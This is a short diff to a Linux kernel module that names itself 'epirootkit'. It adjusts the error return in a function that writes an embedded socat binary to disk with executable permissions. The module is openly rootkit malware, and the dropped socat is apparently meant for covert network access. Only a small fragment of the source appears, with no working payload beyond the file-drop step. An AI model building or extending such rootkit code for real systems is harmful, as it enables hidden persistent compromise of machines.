@@ -12,7 +12,7 @@ int drop_socat_binaire(void){
     f = filp_open(SOCAT_BINARY_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0700);
     if (IS_ERR(f)) {
         pr_err("epirootkit: drop_socat_binaire: failed to open file: %ld\n", PTR_ERR(f));
-        return FAILURE;
+        return -FAILURE;
     }
 
     ssize_t written = kernel_write(f, socat, socat_len, &pos);
